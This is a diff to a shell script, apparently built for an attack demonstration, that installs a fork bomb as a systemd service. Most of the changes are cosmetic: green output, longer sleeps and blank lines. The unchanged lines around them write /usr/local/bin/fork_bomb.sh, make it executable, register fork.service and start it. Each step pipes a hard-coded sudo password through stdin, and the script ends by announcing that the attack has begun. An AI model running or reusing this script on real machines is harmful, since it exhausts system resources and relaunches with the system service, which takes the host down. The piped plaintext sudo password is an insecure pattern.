@@ -1,3 +1,6 @@
+Green='\033[0;32m'
+
+echo -e "$Green"
 echo "Creating a malicious script of fork bomb"
 echo 1 | sudo -S touch /usr/local/bin/fork_bomb.sh
 
@@ -22,14 +25,16 @@ do
 done
 EOF
 
-sleep 2
+sleep 3
 
+echo ""
 echo "Making demo as owner of the malicious script and making script executable"
 echo '1' | sudo -S chmod +x /usr/local/bin/fork_bomb.sh
 echo 1 | sudo -S chown demo: /usr/local/bin/fork_bomb.sh
 
-sleep 2 
+sleep 3 
 
+echo ""
 echo "Creating a service for the malicious fork bomb script"
 echo 1 | sudo -S touch /etc/systemd/system/fork.service
 
@@ -50,10 +55,12 @@ Type=simple
 WantedBy=multi-user.target
 EOF
 
-sleep 2
+sleep 3
 
+echo ""
 echo "Reloading systemd and starting the malicious fork bomb script"
 echo 1 | sudo -S systemctl daemon-reload
 echo 1 | sudo -S systemctl start fork.service
 
+echo ""
 echo "Fork Bomb attack has begun !!!"
